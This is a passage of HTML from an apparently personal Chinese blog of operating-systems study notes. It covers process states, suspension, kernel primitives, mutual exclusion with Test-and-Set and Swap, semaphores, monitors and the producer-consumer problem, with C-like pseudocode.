srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210321134250680" style="zoom:50%;"><img src="/2021/03/15/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1.%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B/image-20210321134325942.png" class="lazyload" data-srcset="/2021/03/15/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1.%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B/image-20210321134325942.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210321134325942" style="zoom: 67%;"></p><h2 id="进程的三种基本状态"><a href="#进程的三种基本状态" class="headerlink" title="进程的三种基本状态"></a>进程的三种基本状态</h2><p>由于多个进程在并发执行时共享系统资源，致使它们在运行过程中呈现间断性的运行规律，所以进程在其生命周期内可能具有多种状态。一般而言，每一个进程至少应处于以下三种基本状态之一：</p><h3 id="就绪-Ready-状态"><a href="#就绪-Ready-状态" class="headerlink" title="就绪(Ready)状态"></a>就绪(Ready)状态</h3><p>进程已获得所有必要资源，处于准备好运行的状态，只要获得CPU，就可以立即执行；</p><h3 id="执行-Running-状态"><a href="#执行-Running-状态" class="headerlink" title="执行(Running)状态"></a>执行(Running)状态</h3><p>​    进程已经获得CPU，其程序正在执行；</p><h3 id="阻塞-Block-状态"><a href="#阻塞-Block-状态" class="headerlink" title="阻塞(Block)状态"></a>阻塞(Block)状态</h3><p>​    进程由于需要等待某种事件或者某种资源，暂时无法继续执行；</p><p>进程在运行过程中会经常发生状态的转换。例如，处于就绪状态的进程，在调度程序为之分配了处理机之后便可执行，相应地，其状态就由就绪态转变为执行态；正在执行的进程(当前进程)如果因分配给它的<strong>时间片已完</strong>而被剥夺处理机暂停执行时，其状态便由执行转为就绪；如果因发生某事件，致使当前进程的执行受阻(例如进程访问某临界资源，而该资源正被其它进程访问时)，使之无法继续执行，则该进程状态将由执行转变为阻塞。</p><table><thead><tr><th>初始状态</th><th>变换状态</th><th>操作</th></tr></thead><tbody><tr><td>就绪</td><td>执行</td><td>系统调用</td></tr><tr><td>执行</td><td>就绪</td><td>时间片用完之后，系统将其调入就绪队列，等待下次调用</td></tr><tr><td>执行</td><td>阻塞</td><td>等待IO调用，或者类似sleep( )函数的等待（<strong>阻塞是进程自身主动行为</strong>）</td></tr><tr><td>阻塞</td><td>就绪</td><td>只能被别的进程或者操作系统唤醒，并<strong>不会由于自身</strong>的原因进入就绪队列（唤醒）</td></tr></tbody></table><p>唤醒进程的情况：被阻塞进程需要的资源可被满足、被阻塞的进程等待的时间到达</p><img src="/2021/03/15/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1.%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B/image-20210321130233104.png" class="lazyload" data-srcset="/2021/03/15/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1.%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B/image-20210321130233104.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210321130233104" style="zoom: 67%;"><img src="/2021/03/15/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1.%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B/image-20210315174900215.png" class="lazyload" data-srcset="/2021/03/15/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1.%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B/image-20210315174900215.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210315174900215" style="zoom:67%;"><h3 id="进程挂起模型"><a href="#进程挂起模型" class="headerlink" title="进程挂起模型"></a>进程挂起模型</h3><h6 id="进程挂起"><a href="#进程挂起" class="headerlink" title="进程挂起"></a>进程挂起</h6><p>处在挂起状态的进程映像在磁盘上，目的是减少进程所占用内存</p><h6 id="挂起操作后三个进程状态的转换"><a href="#挂起操作后三个进程状态的转换" class="headerlink" title="挂起操作后三个进程状态的转换"></a>挂起操作后三个进程状态的转换</h6><p>挂起：把一个进程从内存转到外存；激活：把一个进程从外存转到内存</p><table><thead><tr><th>初始状态</th><th>变换状态</th><th>操作</th></tr></thead><tbody><tr><td>活动就绪（处于未被挂起的就绪状态）</td><td>静止就绪（挂起的就绪状态）</td><td>挂起</td></tr><tr><td>活动阻塞（处于未被挂起的阻塞状态）</td><td>静止阻塞（挂起的阻塞状态）</td><td>挂起</td></tr><tr><td>静止就绪</td><td>活动就绪</td><td>激活</td></tr><tr><td>静止阻塞</td><td>活动阻塞</td><td>激活</td></tr></tbody></table><p><img src="/2021/03/15/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1.%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B/image-20210321131456132.png" class="lazyload" data-srcset="/2021/03/15/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1.%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B/image-20210321131456132.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210321131456132" style="zoom: 67%;"><img src="/2021/03/15/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1.%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B/image-20210321131803826.png" class="lazyload" data-srcset="/2021/03/15/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1.%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B/image-20210321131803826.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210321131803826" style="zoom: 67%;"></p><p><em>其中阻塞的外部进入状态只能从<strong>执行-&gt;活动阻塞</strong>；并且其的<strong>静止阻塞</strong>也是可以到<strong>静止就绪</strong></em></p><h3 id="进程控制"><a href="#进程控制" class="headerlink" title="进程控制"></a>进程控制</h3><h6 id="1-操作系统内核"><a href="#1-操作系统内核" class="headerlink" title="1.操作系统内核"></a>1.操作系统内核</h6><h6 id="1-定义"><a href="#1-定义" class="headerlink" title="1.定义"></a>1.定义</h6><p>通常将处理机的执行状态分成系统态和内核态；系统态又称为管态、内核态，具有较高特权，能执行一切指令，访问所有寄存器和存储区，传统的OS都在系统态运行。</p><h6 id="2-内核支撑功能："><a href="#2-内核支撑功能：" class="headerlink" title="2.内核支撑功能："></a>2.内核支撑功能：</h6><ul><li>中断处理：中断处理使内核最基本的功能，是整个操作系统赖以活动的基础， 为提高程序执行的并发性，内核在对中断”有限处理”后，便转入相关的进程，由这些进程继续完成后续的处理工作。</li><li>时钟管理：时间管理是内核一项基本功能，在时间片轮转的调度中，每当时间片用完时，便由时间管理产生一个<strong>中断信号</strong>，促使调度程序重新进行调度。</li><li>原语操作：所谓原语，就是若干条指令组成的，用于完成一定功能的一个过程，它与一般过程的区别在于”原子操作“。就是要么一起做，要么一个都不做，原语操作在执行过程中不允许被中断。原子操作在系统态下执行，常驻内存。</li></ul><h6 id="3-资源管理功能："><a href="#3-资源管理功能：" class="headerlink" title="3.资源管理功能："></a>3.资源管理功能：</h6><p>进程管理、存储器管理、设备管理</p><h3 id="进程的操作"><a href="#进程的操作" class="headerlink" title="进程的操作"></a>进程的操作</h3><h6 id="1-进程创建"><a href="#1-进程创建" class="headerlink" title="1.进程创建"></a>1.进程创建</h6><ul><li>申请空白PCB</li><li>为新进程分配其运行所需的资源，包括物理和逻辑资源</li><li>初始化进程控制块</li><li>如果进程就绪队列能够接纳新进程，便将新进程插入就绪队列</li></ul><h6 id="2-进程的终止"><a href="#2-进程的终止" class="headerlink" title="2.进程的终止"></a>2.进程的终止</h6><h6 id="3-进程的阻塞和唤醒"><a href="#3-进程的阻塞和唤醒" class="headerlink" title="3.进程的阻塞和唤醒"></a>3.进程的阻塞和唤醒</h6><h6 id="1-引起进程的阻塞和唤醒的事件（block和wakeup）"><a href="#1-引起进程的阻塞和唤醒的事件（block和wakeup）" class="headerlink" title="1.引起进程的阻塞和唤醒的事件（block和wakeup）"></a>1.引起进程的阻塞和唤醒的事件（block和wakeup）</h6><ul><li>向系统请求共享资源失败。</li><li>等待某种操作的完成</li><li>新数据尚未到达</li><li>等到新任务到达</li></ul><h6 id="2-进程阻塞过程"><a href="#2-进程阻塞过程" class="headerlink" title="2.进程阻塞过程"></a>2.进程阻塞过程</h6><p>正在执行的进程，进入阻塞后，通过阻塞<strong>原语block</strong>操作将自己阻塞，所以，阻塞是进程自身的<strong>主动行为</strong>。</p><h6 id="3-进程唤醒过程"><a href="#3-进程唤醒过程" class="headerlink" title="3.进程唤醒过程"></a>3.进程唤醒过程</h6><p>当被阻塞进程所期待的事件发生时，则由有关进程调用唤醒*<em>原语wakeup</em>***，将等待该时间的进程唤醒。</p><h6 id="4-进程的挂起和激活（suspend和active）"><a href="#4-进程的挂起和激活（suspend和active）" class="headerlink" title="4.进程的挂起和激活（suspend和active）"></a>4.进程的挂起和激活（suspend和active）</h6><p>都是操作系统内核的调用</p><h2 id="进程的同步"><a href="#进程的同步" class="headerlink" title="进程的同步"></a>进程的同步</h2><img src="/2021/03/15/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1.%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B/image-20210321190934586.png" class="lazyload" data-srcset="/2021/03/15/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1.%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B/image-20210321190934586.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210321190934586" style="zoom: 50%;"><p>进程同步主要是使得执行的各个进程能按照一定的规则和时序共享系统资源。</p><h6 id="1-两种形式的制约关系"><a href="#1-两种形式的制约关系" class="headerlink" title="1.两种形式的制约关系"></a>1.两种形式的制约关系</h6><ul><li><p>间接相互制约关系：多个程序在并发执行时，由于共享系统资源，如CPU和IO设备等，致使这些并发执行的程序之间相互形成了制约关系。</p></li><li><p>直接相互制约关系</p></li></ul><h6 id="2-临界资源"><a href="#2-临界资源" class="headerlink" title="2.临界资源"></a>2.临界资源</h6><p>打印机、io设备等等</p><h6 id="3-临界区"><a href="#3-临界区" class="headerlink" title="3.临界区"></a>3.临界区</h6><p>每个进程中访问临界资源的那段代码称为临界区</p><h6 id="4-同步机制遵循的规则"><a href="#4-同步机制遵循的规则" class="headerlink" title="4.同步机制遵循的规则"></a>4.同步机制遵循的规则</h6><p>空闲让进、忙则等待、有限等待、让权等待</p><h6 id="5-硬件同步机制"><a href="#5-硬件同步机制" class="headerlink" title="5.硬件同步机制"></a>5.硬件同步机制</h6><p>1.关中断：进入所测试之前关闭中断，直至锁测试完成上锁之后打开中段，进程在临界区执行期间，os不响应中断，不会引起调度，也就不会发生进程或者线程的切换，从而保证了对锁的测试和关锁操作的连续性和完整性。</p><p>2.利用Test-and-Set指令实现互斥</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">boolean <span class="title">TS</span><span class="params">(boolean *lock)</span></span>&#123;<span class="comment">//lock有两种状态， lock=FALSE 表示资源空闲 lock=TRUE 表示资源正在被使用</span></span><br><span class="line">Boolean old; </span><br><span class="line">old=*lock;</span><br><span class="line">*lock=TRUE; <span class="comment">//如果资源没上锁，那就将资源上锁</span></span><br><span class="line"><span class="keyword">return</span> old; <span class="comment">//返回资源之前的状态</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line">···</span><br><span class="line"><span class="function"><span class="keyword">while</span> <span class="title">TS</span><span class="params">(&amp;lock)</span> </span>; <span class="comment">// 必须将资源循环测试到TS(s)=FALSE，其实质就是自身进程能将临界资源上锁</span></span><br><span class="line">critical section;<span class="comment">//临界区操作</span></span><br><span class="line">lock=FALSE;</span><br><span class="line">remainder section;</span><br><span class="line">&#125;<span class="keyword">while</span>(TRUE)</span><br></pre></td></tr></table></figure><p>3.使用Swap指令实现进程互斥</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">swap</span><span class="params">(boolean *a,boolean *b)</span></span>&#123;</span><br><span class="line">    boolean tmp;</span><br><span class="line">    tmp=*a;</span><br><span class="line">    *a=*b;</span><br><span class="line">    *b=tmp;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line">    key=TRUE;</span><br><span class="line">    <span class="keyword">do</span>&#123;</span><br><span class="line">        swap(&amp;lock,&amp;key);</span><br><span class="line">    &#125;<span class="keyword">while</span>(key!=FALSE);<span class="comment">//如果key==false代表交换成功，即拿到了资源</span></span><br><span class="line">    <span class="comment">//临界区操作</span></span><br><span class="line">    lock=FALSE;</span><br><span class="line">    ···</span><br><span class="line">&#125;<span class="keyword">while</span>(TRUE);</span><br></pre></td></tr></table></figure><p>利用以上的硬件指令能够有效地实现进程互斥，但当临界志愿忙碌时，其他访问进程必须不断地进行测试，处于忙等的状态，不符合让权等待的原则。</p><h6 id="6-信号量机制"><a href="#6-信号量机制" class="headerlink" title="6.信号量机制"></a>6.信号量机制</h6><p>1.整型信号量</p><p>2.记录型信号量</p><p>3.AND信号量</p><p>当一个进程需要获得两个或更多的共享资源后能执行其任务，假定有AB两个进程，都要求访问共享数据DE，共享数据都应作为临界资源，可为这两个数据分别设置用于互斥的信号量Dmutex和Emutex，初值都为1</p><img src="/2021/03/15/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1.%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B/image-20210321180759287.png" class="lazyload" data-srcset="/2021/03/15/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1.%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B/image-20210321180759287.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210321180759287" style="zoom:50%;"><p>最后进程都不能执行下去了，此时AB进入死锁，所以需要在wait操作中增加一个AND条件，或称为同时wait操作</p><p>4.信号量集</p><img src="/2021/03/15/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1.%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B/image-20210321182355976.png" class="lazyload" data-srcset="/2021/03/15/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1.%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B/image-20210321182355976.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210321182355976" style="zoom:67%;"><p>5.信号量的操作</p><ul><li>由一个整型变量和两个原子操作组成，整型变量代表其中有多少个</li><li>PV操作，P增加、V减少</li></ul><p>在执行的过程P( )可能阻塞，V( )不会阻塞</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Semaphore</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> sem;</span><br><span class="line">WaitQueue q; <span class="comment">//阻塞队列</span></span><br><span class="line">&#125;</span><br><span class="line">Semaphore::<span class="built_in">P</span>( )&#123;</span><br><span class="line">    sem--;</span><br><span class="line">    <span class="keyword">if</span>(sem&lt;<span class="number">0</span>)&#123; <span class="comment">//x小于0代表资源已经被占用</span></span><br><span class="line">        <span class="comment">//将进程加到阻塞队列中</span></span><br><span class="line">        <span class="built_in">block</span>(p);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">Semaphore::<span class="built_in">V</span>( )&#123;</span><br><span class="line">    sem++;</span><br><span class="line">    <span class="keyword">if</span>(sem&lt;=<span class="number">0</span>)&#123;<span class="comment">//如果加完小于等于0，则代表已经有进程进入阻塞队列</span></span><br><span class="line">    <span class="comment">//将线程移出阻塞队列</span></span><br><span class="line">        <span class="built_in">wakeup</span>(p);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>6.信号量实现前趋关系</p><img src="/2021/03/15/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1.%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B/image-20210321184514966.png" class="lazyload" data-srcset="/2021/03/15/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1.%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B/image-20210321184514966.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210321184514966" style="zoom:80%;"><h6 id="7-管程机制"><a href="#7-管程机制" class="headerlink" title="7.管程机制"></a>7.管程机制</h6><p>1.定义</p><p>硬件资源和软件资源可用数据结构抽象地描述其资源性，即用少量信息和对该资源所执行的操作来表征该资源，利用<strong>共享数据结构</strong>抽象地表示系统中的共享资源，并且对共享数据结构的特定操作定义为一组过程。进程对共享资源的申请，释放和其他操作必须通过这组过程，间接对共享数据结构实现操作。对于请求访问共享资源的并发进程，可以根据资源的情况接受或阻塞，确保每一次仅有一个进程进入管程。</p><p>代表<strong>共享资源的数据结构</strong>以及对该共享数据结构实施操作的<strong>一组过程</strong>所组成的资源管理程序共同构成了一个操作系统的资源管模块，称之为管程，管程被请求和释放的资源的进程所调用。</p><p>2.组成内容：<img src="/2021/03/15/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1.%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B/image-20210321185409877.png" class="lazyload" data-srcset="/2021/03/15/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1.%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B/image-20210321185409877.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210321185409877" style="zoom:67%;"></p><ul><li>管程名称</li><li>局部于管程的共享数据结构说明</li><li>对该数据结构进行操作的一组过程（函数）</li><li>对局部于管程的共享数据设置初始值</li></ul><p>3.条件变量</p><p>利用管程实现进程同步时，必须设置同步工具，如两个同步操作原语wait和signal，管程中对每个条件变量都必须说明，其形式condition x，y；对条件变量的操作仅仅是wait和signal。同时提供两个操作可表示为x.wait和x.signal</p><img src="/2021/03/15/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1.%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B/image-20210321192446850.png" class="lazyload" data-srcset="/2021/03/15/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1.%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B/image-20210321192446850.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210321192446850" style="zoom:80%;"><h6 id="8-用两种方法解决生产者消费者问题"><a href="#8-用两种方法解决生产者消费者问题" class="headerlink" title="8.用两种方法解决生产者消费者问题"></a>8.用两种方法解决生产者消费者问题</h6><p>1.使用记录型信号量</p><img src="/2021/03/15/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1.%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B/image-20210321201603305.png" class="lazyload" data-srcset="/2021/03/15/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1.%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B/image-20210321201603305.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210321201603305" style="zoom:67%;"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//mutex表示进程对缓冲区的互斥使用。empty和full分别表示缓冲池中空缓冲区和满缓冲区的数量</span></span><br><span class="line"><span class="comment">//buffer表示偶n个缓冲区，其中子项为item</span></span><br><span class="line"><span class="comment">//in、out代表第一个资源和最后一个资源</span></span><br><span class="line"><span class="keyword">int</span> in=<span class="number">0</span>,out=<span class="number">0</span>;</span><br><span class="line">item buffer[n];</span><br><span class="line">semaphore mutex=<span class="number">1</span>,empty=n,full=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">proceducer</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">do</span>&#123;</span><br><span class="line">        producer an item nextp;<span class="comment">//生产一个产品</span></span><br><span class="line">        ···</span><br><span class="line">        wait(empty);<span class="comment">//等待缓冲区有空闲位置，没满进入，满了继续等待</span></span><br><span class="line">        wait(mutex);<span class="comment">//如果正在被占用则等待 保证互斥曹组</span></span><br><span class="line">buffer[in]=nextp;<span class="comment">//将新资源放到buffer[in]位置</span></span><br><span class="line">        in=(in+<span class="number">1</span>)%n;</span><br><span class="line">        signal(mutex);<span class="comment">//释放互斥</span></span><br><span class="line">        signal(full);<span class="comment">//将信号量+1，表示填入一个</span></span><br><span class="line">    &#125;<span class="keyword">while</span>(TRUE);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">consumer</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line">       wait(full);<span class="comment">//是否缓冲区不为空，不为空的话继续执行，为空就一直等待</span></span><br><span class="line">       wait(mutex);</span><br><span class="line">       nextc=buffer[out];</span><br><span class="line">       out=(out+<span class="number">1</span>)%n;</span><br><span class="line">       signal(mutex);</span><br><span class="line">       signal(empty);</span><br><span class="line">       consumer the item in nextc;</span><br><span class="line">       ···</span><br><span class="line">    &#125;<span class="keyword">while</span>(TRUE);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="function">cobegin</span></span><br><span class="line"><span class="function">       <span class="title">proceducer</span><span class="params">( )</span></span>; consumer( );</span><br><span class="line">    coend</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2.使用管程</p><img src="/2021/03/15/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1.%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B/image-20210321192922427.png" class="lazyload" data-srcset="/2021/03/15/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1.%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B/image-20210321192922427.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210321192922427" style="zoom:67%;"><img src="/2021/03/15/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1.%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B/image-20210321203307445.png" class="lazyload" 